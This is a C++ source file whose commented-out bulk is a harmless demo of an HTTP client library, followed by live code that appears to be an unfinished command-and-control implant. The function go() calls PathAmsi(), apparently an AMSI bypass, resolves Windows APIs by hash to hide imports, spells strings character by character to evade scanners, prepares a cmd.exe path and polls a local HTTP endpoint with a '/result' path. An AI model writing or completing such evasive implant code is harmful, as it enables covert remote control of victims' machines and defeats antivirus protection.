//#include "HttpClient.h"
//#include "CRT.h"
//#include <stdio.h>
//#include <stdlib.h>
//#include <time.h>
//#include <stdint.h>
//
//using namespace HttpLib;
//
//static wchar_t HTTPBIN_URL[256] = L"https://httpbin.org";
//
//// ============= Helper Functions =============
//static void GenerateUuidV4(wchar_t* output, int size) {
//    static const wchar_t hexChars[] = L"0123456789abcdef";
//    wchar_t uuid[37] = {};
//
//    for (int i = 0; i < 36; i++) {
//        int rnd = rand() % 16;
//        if (i == 8 || i == 13 || i == 18 || i == 23) {
//            uuid[i] = L'-';
//        }
//        else {
//            uuid[i] = hexChars[rnd];
//        }
//    }
//    uuid[14] = L'4';
//    uuid[19] = hexChars[rand() % 4 + 8];
//    uuid[8] = uuid[13] = uuid[18] = uuid[23] = L'-';
//    uuid[36] = L'\0';
//
//    wcsncpy(output, uuid, size - 1);
//    output[size - 1] = L'\0';
//}
//
//static void GenerateDmTs(wchar_t* output, int size) {
//    uint64_t millis = (uint64_t)time(NULL) * 1000;
//    swprintf(output, size, L"%llu", (unsigned long long)millis);
//}
//
//static void RandomBase36(wchar_t* output, int length) {
//    static const wchar_t chars[] = L"0123456789abcdefghijklmnopqrstuvwxyz";
//    for (int i = 0; i < length; i++) {
//        output[i] = chars[rand() % 36];
//    }
//    output[length] = L'\0';
//}
//
//static void BuildDailymotionUrl(const wchar_t* videoId, wchar_t* output, int size) {
//    wchar_t dmV1st[40], dmTs[30], dmViewId[30];
//
//    GenerateUuidV4(dmV1st, 40);
//    GenerateDmTs(dmTs, 30);
//    RandomBase36(dmViewId, 22);
//
//    swprintf(output, size,
//        L"https://www.dailymotion.com/player/metadata/video/%s"
//        L"?embedder=https://www.dailymotion.com/video/%s"
//        L"&geo=1"
//        L"&player-id=xtv3w"
//        L"&locale=en-US"
//        L"&dmV1st=%s"
//        L"&dmTs=%s"
//        L"&is_native_app=0"
//        L"&app=com.dailymotion.neon"
//        L"&client_type=website"
//        L"&dmViewId=%s"
//        L"&section_type=player"
//        L"&component_style=_"
//        L"&parallelCalls=1",
//        videoId, videoId, dmV1st, dmTs, dmViewId);
//}
//
//void PrintResponse(HttpResponse* response) {
//    if (!response) return;
//
//    wprintf(L"=== Response ===\n");
//    wprintf(L"Status: %d %s\n", response->statusCode, response->statusText);
//    wprintf(L"Success: %s\n", response->success ? L"YES" : L"NO");
//
//    if (!response->success) {
//        wprintf(L"Error Code: %d\n", response->errorCode);
//        wprintf(L"Error Message: %s\n", response->errorMessage);
//        return;
//    }
//
//    wprintf(L"Body Length: %d bytes\n", response->bodyLength);
//
//    if (response->headers && response->headerCount > 0) {
//        wprintf(L"Headers:\n");
//        for (int i = 0; i < response->headerCount; i++) {
//            wprintf(L"  %s: %s\n", response->headers[i].name, response->headers[i].value);
//        }
//    }
//
//    if (response->body && response->bodyLength > 0) {
//        wprintf(L"Body: %s\n", response->body);
//    }
//}
//
//void ExampleBasicGet() {
//    wprintf(L"\n=== Example 1: Basic GET Request ===\n");
//
//HttpClient client;
//    client.SetTimeout(30000);
//
//    HttpResponse response;
//    HttpResponse_Init(&response);
//
//    wchar_t url[512];
//    wcscpy(url, HTTPBIN_URL);
//    wcscat(url, L"/get");
//
//    client.Get(&response, url);
//    PrintResponse(&response);
//    HttpResponse_Free(&response);
//}
//
//void ExamplePostJson() {
//    wprintf(L"\n=== Example 2: POST JSON Data ===\n");
//
//HttpClient client;
//
//    const wchar_t body[] = {L'{', L'\\', L'"', L'n', L'a', L'm', L'e', L'\\', L'"', L':', L' ', L'\\', L'"', L't', L'e', L's', L't', L'\\', L'"', L',', L' ', L'\\', L'"', L'v', L'a', L'l', L'u', L'e', L'\\', L'"', L':', L' ', L'1', L'2', L'3', L'}', L'\0'};
//    DWORD bodyLen = (DWORD)crt_wcslen(body);
//
//    HttpHeader headers[2];
//    wcscpy(headers[0].name, L"Content-Type");
//    wcscpy(headers[0].value, L"application/json");
//    wcscpy(headers[1].name, L"Accept");
//    wcscpy(headers[1].value, L"application/json");
//
//    HttpResponse response;
//    HttpResponse_Init(&response);
//
//    wchar_t url[512];
//    wcscpy(url, HTTPBIN_URL);
//    wcscat(url, L"/post");
//
//    client.Post(&response, url, body, bodyLen, headers, 2);
//    PrintResponse(&response);
//    HttpResponse_Free(&response);
//}
//
//void ExamplePutRequest() {
//    wprintf(L"\n=== Example 3: PUT Request ===\n");
//
//HttpClient client;
//
//    const wchar_t body[] = {L'{', L'\\', L'"', L'u', L'p', L'd', L'a', L't', L'e', L'\\', L'"', L':', L' ', L'\\', L'"', L'd', L'a', L't', L'a', L'\\', L'"', L'}', L'\0'};
//    DWORD bodyLen = (DWORD)wcslen(body);
//
//    HttpHeader header;
//    wcscpy(header.name, L"Content-Type");
//    wcscpy(header.value, L"application/json");
//
//    HttpResponse response;
//    HttpResponse_Init(&response);
//
//    wchar_t url[512];
//    wcscpy(url, HTTPBIN_URL);
//    wcscat(url, L"/put");
//
//    client.Put(&response, url, body, bodyLen, &header, 1);
//    PrintResponse(&response);
//    HttpResponse_Free(&response);
//}
//
//void ExampleDeleteRequest() {
//    wprintf(L"\n=== Example 4: DELETE Request ===\n");
//
//HttpClient client;
//
//    HttpResponse response;
//    HttpResponse_Init(&response);
//
//    wchar_t url[512];
//    wcscpy(url, HTTPBIN_URL);
//    wcscat(url, L"/delete");
//
//    client.Delete(&response, url);
//    PrintResponse(&response);
//    HttpResponse_Free(&response);
//}
//
//void ExamplePatchRequest() {
//    wprintf(L"\n=== Example 5: PATCH Request ===\n");
//
//HttpClient client;
//
//    const wchar_t body[] = {L'{', L'\\', L'"', L'p', L'a', L't', L'c', L'h', L'\\', L'"', L':', L' ', L'\\', L'"', L'v', L'a', L'l', L'u', L'e', L'\\', L'"', L'}', L'\0'};
//    DWORD bodyLen = (DWORD)wcslen(body);
//
//    HttpHeader header;
//    wcscpy(header.name, L"Content-Type");
//    wcscpy(header.value, L"application/json");
//
//    HttpResponse response;
//    HttpResponse_Init(&response);
//
//    wchar_t url[512];
//    wcscpy(url, HTTPBIN_URL);
//    wcscat(url, L"/patch");
//
//    client.Patch(&response, url, body, bodyLen, &header, 1);
//    PrintResponse(&response);
//    HttpResponse_Free(&response);
//}
//
//void ExampleHeadRequest() {
//    wprintf(L"\n=== Example 6: HEAD Request ===\n");
//
//HttpClient client;
//
//    HttpResponse response;
//    HttpResponse_Init(&response);
//
//    wchar_t url[512];
//    wcscpy(url, HTTPBIN_URL);
//    wcscat(url, L"/get");
//
//    client.Head(&response, url);
//    PrintResponse(&response);
//    HttpResponse_Free(&response);
//}
//
//void ExampleUrlEncoding() {
//    wprintf(L"\n=== Example 7: URL Encoding/Decoding ===\n");
//
//    const wchar_t original[] = {L'H', L'e', L'l', L'l', L'o', L' ', L'W', L'o', L'r', L'l', L'd', L'!', L' ', L'@', L'#', L'$', L'%', L'\0'};
//    wchar_t encoded[512] = {};
//    wchar_t decoded[512] = {};
//
//    HttpClient::UrlEncode(original, encoded, 512);
//    HttpClient::UrlDecode(encoded, decoded, 512);
//
//    wprintf(L"Original: %s\n", original);
//    wprintf(L"Encoded:  %s\n", encoded);
//    wprintf(L"Decoded:  %s\n", decoded);
//}
//
//void ExampleUsingRequestBuilder() {
//    wprintf(L"\n=== Example 8: Using HttpRequest Struct ===\n");
//
//HttpClient client;
//
//    HttpRequest request;
//    HttpRequest_Init(&request);
//
//    request.method = HTTP_POST;
//
//    wchar_t url[512];
//    wcscpy(url, HTTPBIN_URL);
//    wcscat(url, L"/post");
//    wcscpy(request.url, url);
//
//    const wchar_t body[] = {L'{', L'\\', L'"', L'b', L'u', L'i', L'l', L't', L'\\', L'"', L':', L' ', L'\\', L'"', L'w', L'i', L't', L'h', L'-', L'b', L'u', L'i', L'l', L'd', L'e', L'r', L'\\', L'"', L'}', L'\0'};
//    request.body = (wchar_t*)body;
//    request.bodyLength = (DWORD)wcslen(body);
//
//    HttpRequest_AddHeader(&request, L"Content-Type", L"application/json");
//    HttpRequest_AddHeader(&request, L"X-Custom-Header", L"custom-value");
//
//    HttpResponse response;
//    HttpResponse_Init(&response);
//
//    client.SendRequest(&response, &request);
//    PrintResponse(&response);
//    HttpResponse_Free(&response);
//    HttpRequest_Free(&request);
//}
//
//void ExampleDailyMotionApi() {
//    wprintf(L"\n=== Example 9: DailyMotion API ===\n");
//
//HttpClient client;
//    client.SetTimeout(30000);
//
//    const wchar_t videoId[] = {L'x', L'a', L'7', L'e', L'w', L'f', L'g', L'\0'};
//    wchar_t url[2048];
//    BuildDailymotionUrl(videoId, url, 2048);
//
//    wprintf(L"Video ID: %s\n", videoId);
//    wprintf(L"URL: %s\n\n", url);
//
//    HttpHeader header;
//    wcscpy(header.name, L"Referer");
//    wcscpy(header.value, L"https://www.dailymotion.com/video/xa7ewfg");
//
//    HttpResponse response;
//    HttpResponse_Init(&response);
//
//    client.Get(&response, url, &header, 1);
//
//    wprintf(L"Status: %d %s\n", response.statusCode, response.statusText);
//    wprintf(L"Success: %s\n", response.success ? L"YES" : L"NO");
//
//    if (response.body && response.bodyLength > 0) {
//        wprintf(L"\nResponse Body:\n%ls\n", response.body);
//    }
//
//    HttpResponse_Free(&response);
//}
//
//int wmain() {
//    wprintf(L"========================================\n");
//    wprintf(L"       HttpLib WinHTTP Demo\n");
//    wprintf(L"========================================\n");
//    LoadLibraryA("winhttp.dll");
//    ExampleBasicGet();
//    ExamplePostJson();
//    ExamplePutRequest();
//    ExampleDeleteRequest();
//    ExamplePatchRequest();
//    ExampleHeadRequest();
//    ExampleUrlEncoding();
//    ExampleUsingRequestBuilder();
//    ExampleDailyMotionApi();
//
//    wprintf(L"\n========================================\n");
//    wprintf(L"           Demo Complete\n");
//    wprintf(L"========================================\n");
//
//    return 0;
//}


//void PrintResponse(HttpResponse* response) {
//    if (!response) return;
//
//    wprintf(L"=== Response ===\n");
//    wprintf(L"Status: %d %s\n", response->statusCode, response->statusText);
//    wprintf(L"Success: %s\n", response->success ? L"YES" : L"NO");
//
//    if (!response->success) {
//        wprintf(L"Error Code: %d\n", response->errorCode);
//        wprintf(L"Error Message: %s\n", response->errorMessage);
//        return;
//    }
//
//    wprintf(L"Body Length: %d bytes\n", response->bodyLength);
//
//    if (response->headers && response->headerCount > 0) {
//        wprintf(L"Headers:\n");
//        for (int i = 0; i < response->headerCount; i++) {
//            wprintf(L"  %s: %s\n", response->headers[i].name, response->headers[i].value);
//        }
//    }
//
//    if (response->body && response->bodyLength > 0) {
//        wprintf(L"Body: %s\n", response->body);
//    }
//}
//

#include "HttpClient.h"
#include "CRT.h"
#include "ApiResolve.h"
#include "HashString.h"
#include "Custom.h"

using namespace HttpLib;

void go() {
    PathAmsi();
    ApiResolve api;
    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
    LPVOID lpKernel32 = api.GetModuleBaseAddress(hashKernel32);
    typedef HMODULE
        (WINAPI*
        _LoadLibraryA)(
            _In_ LPCSTR lpLibFileName
        );
    constexpr unsigned int hashLoadLibraryA = ComplexHashForAnsi("LoadLibraryA");
    _LoadLibraryA pLoadLibraryA = (_LoadLibraryA)api.GetApiAddress(lpKernel32, hashLoadLibraryA);
    const char sDll[] = {'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};
    pLoadLibraryA(sDll);
    wchar_t url[] = {L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'8', L'0',  L'\0'};
    wchar_t url2[] = { L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'8', L'0', L'/', L'r', L'e', L's', L'u', L'l', L't', L'\0'};
    HttpClient client;
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    si.cb = sizeof(si);
    wchar_t path[] = {
        L'C', L':', L'\\', L'\\',
        L'W', L'i', L'n', L'd', L'o', L'w', L's',
        L'\\', L'\\',
        L'S', L'y', L's', L't', L'e', L'm',
        L'3', L'2',
        L'\\', L'\\',
        L'c', L'm', L'd', L'.', L'e', L'x', L'e',
        L'\0'
        };

    typedef VOID
        (WINAPI*
        _Sleep)(
            _In_ DWORD dwMilliseconds
        );

    constexpr unsigned int hashSleep = ComplexHashForAnsi("Sleep");
    _Sleep pSleep = (_Sleep)api.GetApiAddress(lpKernel32, hashSleep);

    HttpResponse response;
    HttpResponse_Init(&response);

    client.Get(&response, url);

}

int main() {

}